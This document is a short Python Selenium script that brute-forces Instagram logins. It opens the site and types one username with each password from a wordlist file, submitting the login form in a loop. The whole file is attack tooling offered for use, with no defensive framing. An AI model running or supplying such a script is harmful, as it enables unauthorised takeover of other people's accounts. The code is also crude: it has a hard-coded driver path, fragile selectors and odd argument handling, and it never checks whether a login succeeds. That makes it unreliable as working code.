#!/usr/bin/python
import sys
import getopt
import time
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

browser = webdriver.Chrome('/Users/aitorgarcia/Downloads/chromedriver')
browser.get('http://www.instagram.com')

# global varibles
usernameInput = sys.argv[1:]
wordlist = sys.argv[2:]
wordlist = re.sub('[^a-zA-Z.]+', '', str(wordlist)) # clean string
usernameInput = str(usernameInput[0])

# init
accept_cookies = browser.find_element_by_css_selector("body > div.RnEpo.Yx5HN._4Yzd2 > div > div > button.aOOlW.bIiDR")
accept_cookies.click()
time.sleep(2.5)

# login function which is called every try
def login(line):
    # type username and password and login
    username = browser.find_element_by_css_selector('#loginForm > div > div:nth-child(1) > div > label > input')
    password = browser.find_element_by_css_selector('#loginForm > div > div:nth-child(2) > div > label > input')
    loginButton = browser.find_element_by_css_selector('#loginForm > div > div:nth-child(3) > button > div')
    username.send_keys(usernameInput)
    password.send_keys(line)
    time.sleep(2)
    loginButton.click()
     
    time.sleep(2)
    
    browser.refresh()

# main function
def main(wordlist):
    f = open(str(wordlist), 'r')
    for line in f:
        login(line)
        time.sleep(2)

main(wordlist)
